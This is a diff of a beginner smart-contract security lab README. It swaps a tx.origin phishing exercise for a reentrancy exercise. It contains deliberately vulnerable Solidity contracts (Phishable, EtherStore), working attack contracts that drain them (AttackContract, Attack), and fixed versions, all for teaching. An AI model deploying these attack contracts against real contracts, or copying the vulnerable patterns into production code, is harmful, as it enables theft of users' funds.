@@ -1,7 +1,7 @@
 # Module 9 - Beginner Lab: Smart Contract Security
 
 ## Background
-As with all software, there is a chance that a smart contract may be exploited. In the case of smart contracts, though, there is an especially high risk, since transactions are permanent and wallets are essentially anonymous. To prevent financial loss, it is a good idea to follow best practices for secure programming.
+As with all software, there is a chance that a smart contract may be exploited. In the case of smart contracts, though, there is an especially high risk, since transactions are permanent and wallets are essentially anonymous. To prevent financial loss, it is a good idea to follow best practices for secure programming, such as the [checks-effects-interactions pattern][checks-effects-interactions].
 
 ## Meta Information
 | Attribute | Explanation |
@@ -15,62 +15,98 @@ As with all software, there is a chance that a smart contract may be exploited. 
 | Dependencies | Some programming knowledge and an internet-connected computer with a suitable browser for use of [the Remix IDE][Remix]. |
 | Variants | There are many other vulnerabilities which could be the focus of this lab instead. |
 
-## Assignment Instructions (5 Minutes)
-1. In Solidity, there is a global variable called `tx.origin`, which contains the address of the account that originally sent the call or the transaction. In this lab, we will explore why using `tx.origin` as a form of authentication can lead to exploitation.
-2. First, we begin by creating a contract with a simple purpose such as temporarily holding Ether for the owner (just as legitimate contracts in use hold Ether to enable various functions). Copy the following code into [Remix]:  
-    [_Phishable.sol_][Phishable.sol]
+## Assignment Instructions
+1. First, we begin by creating a contract with a simple purpose, such as temporarily holding Ether for the owner(s). Copy the following code into [Remix][Remix]:  
+    [_EtherStore.sol_][EtherStore.sol]
     ```solidity
-    contract Phishable {
-        address public owner;
-        constructor (address _owner) {
-            owner = _owner;
+    contract EtherStore {
+
+        uint256 public withdrawalLimit = 1 ether;
+        mapping(address => uint256) public lastWithdrawTime;
+        mapping(address => uint256) public balances;
+
+        function depositFunds() public payable {
+            balances[msg.sender] += msg.value;
         }
 
-        function () public payable {} // collect ether
-
-        function withdrawAll(address _recipient) public {
-            require(tx.origin == owner);
-            _recipient.transfer(this.balance);
+        function withdrawFunds (uint256 _weiToWithdraw) public {
+            require(balances[msg.sender] >= _weiToWithdraw);
+            // limit the withdrawal
+            require(_weiToWithdraw <= withdrawalLimit);
+            // limit the time allowed to withdraw
+            require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
+            require(msg.sender.call.value(_weiToWithdraw)());
+            balances[msg.sender] -= _weiToWithdraw;
+            lastWithdrawTime[msg.sender] = now;
         }
+     }
+    ```
+2. We then create another contract to attack `EtherStore.sol`. Create a new contract, `Attack.sol`:  
+    [_Attack.sol_][Attack.sol]
+    ```solidity
+    import "EtherStore.sol";
+
+    contract Attack {
+      EtherStore public etherStore;
+
+      // intialize the etherStore variable with the contract address
+      constructor(address _etherStoreAddress) {
+          etherStore = EtherStore(_etherStoreAddress);
+      }
+
+      function attackEtherStore() public payable {
+          // attack to the nearest ether
+          require(msg.value >= 1 ether);
+          // send eth to the depositFunds() function
+          etherStore.depositFunds.value(1 ether)();
+          // start the magic
+          etherStore.withdrawFunds(1 ether);
+      }
+
+      function collectEther() public {
+          msg.sender.transfer(this.balance);
+      }
+
+      // fallback function - where the magic happens
+      function () payable {
+          if (etherStore.balance > 1 ether) {
+              etherStore.withdrawFunds(1 ether);
+          }
+      }
     }
     ```
-3. We then create another contract to attack `Phishable.sol`. In a new document, create `AttackContract.sol`:  
-    [_AttackContract.sol_][AttackContract.sol]
+3. In `Attack`, observe that whenever this contract's `attackEtherStore` function is called with a transaction amount >= 1 ether, it then calls the `EtherStore` contract’s `depositFunds` function, followed immediately by `EtherStore`'s `withdrawFunds` function. The `EtherStore` contract verifies the balance, owner, withdrawal amount, and time since last withdrawal are all okay and proceeds to pay the attacking contract. So far, everything seems okay; however, once the `EtherStore` contract pays the `Attack` contract, execution of the code flows into the `Attack` contract's fallback function (the function called when a contract is paid any amount). Inside the `Attack` contract's fallback function, `EtherStore`'s balance is checked, and provided there is ether remaining to steal, the `withdrawFunds` function is called again. The `Attack` contract has, in effect, caused execution to "reenter" the `EtherStore` contract's `withdrawFunds` function before it could update the values it checks to ensure everything is okay before paying out.
+4. We can prevent an attack like this a few different ways. One way is to use the built-in `transfer` function, which only sends 2300 gas, insufficient to allow the current execution to call the `withdrawFunds` function again. An other way is to use what's known as the [checks-effects-interactions pattern][checks-effects-interactions], which would have us move lines 18 and 19 to before line 17, so that updates to checked variables are done before interaction with an outside entity. One more way we could prevent this attack is with an additional state variable, called a mutex or mutual exclusion variable, which acts as a lock and prevents further execution from occurring until the current function exits (and resets the mutex). Including all three methods (though any one would work), we have a more-secure `EtherStore`, which we'll call `SecuredEtherStore`:  
+    [_SecuredEtherStore.sol_][SecuredEtherStore.sol]
     ```solidity
-    import "browser/Phishable.sol";
+    contract SecuredEtherStore {
 
-    contract AttackContract {
-        Phishable phishableContract;
+        // initialize the mutex
+        bool reEntrancyMutex = false;
+        uint256 public withdrawalLimit = 1 ether;
+        mapping(address => uint256) public lastWithdrawTime;
+        mapping(address => uint256) public balances;
 
-        address attacker; // The attacker's address to receive funds
-
-        constructor (Phishable _phishableContract, address _attackerAddress) {
-            phishableContract = _phishableContract;
-            attacker = _attackerAddress;
+        function depositFunds() public payable {
+            balances[msg.sender] += msg.value;
         }
 
-        function () payable {
-            phishableContract.withdrawAll(attacker);
+        function withdrawFunds (uint256 _weiToWithdraw) public {
+            require(!reEntrancyMutex);
+            require(balances[msg.sender] >= _weiToWithdraw);
+            // limit the withdrawal
+            require(_weiToWithdraw <= withdrawalLimit);
+            // limit the time allowed to withdraw
+            require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
+            balances[msg.sender] -= _weiToWithdraw;
+            lastWithdrawTime[msg.sender] = now;
+            // set the reEntrancy mutex before the external call
+            reEntrancyMutex = true;
+            msg.sender.transfer(_weiToWithdraw);
+            // release the mutex after the external call
+            reEntrancyMutex = false;
         }
-    }
-    ```
-4. In `AttackContract`, we see that whenever this contract is paid an amount, it then calls the `Phishable` contract’s `withdrawAll` function providing the address to send funds to. The `Phishable` contract mistakenly authorizes this transaction, because its owner is the originator of the transaction (from paying the attacker’s contract). Why would the owner pay the attacker’s contract? Perhaps the attacker provided the contract’s address as their payment address in a private transaction with the owner of `Phishable`. This is an example of a spearphishing attack, where the attacker would have identified that `Phishable` is phishable and then organized a plan of attack to have the owner of the `Phishable` contract be involved in a transaction that would allow this attack to occur. Now, assume you are the owner of Phishable, but you see this coming before you deploy; how would you fix it?
-5. We can prevent an attack like this (that is, exploiting the use of tx.origin for authentication purposes) by checking that the sender is the owner instead. In the `Phishable.sol` contract, change the line `require(tx.origin == owner);` to `require(msg.sender == owner);`. Now, when `AttackContract` is paid an amount by the owner of `Phishable` and calls `Phishable`’s `withdrawAll` function, the funds will not be transferred to the attacker’s address, since they are not the owner. We'll call this updated version `UnPhishable`. The code should look like this:  
-    [_UnPhishable.sol_][UnPhishable.sol]
-    ```solidity
-    contract UnPhishable {
-        address public owner;
-        constructor (address _owner) {
-            owner = _owner;
-        }
-
-        function () public payable {} // collect ether
-
-        function withdrawAll(address _recipient) public {
-            require(msg.sender == owner);
-            _recipient.transfer(this.balance);
-        }
-    }
+     }
     ```
 
 ## Credits
@@ -80,6 +116,7 @@ Saxon Knight
 https://github.com/ethereumbook/ethereumbook  
 
 [Remix]: https://remix.ethereum.org/
-[Phishable.sol]: https://github.com/UHMC/module-9-lab-beginner/blob/master/Phishable.sol
-[AttackContract.sol]: https://github.com/UHMC/module-9-lab-beginner/blob/master/AttackContract.sol
-[UnPhishable.sol]: https://github.com/UHMC/module-9-lab-beginner/blob/master/UnPhishable.sol
+[EtherStore.sol]: EtherStore.sol
+[Attack.sol]: Attack.sol
+[SecuredEtherStore.sol]: SecuredEtherStore.sol
+[checks-effects-interactions]: https://solidity.readthedocs.io/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern
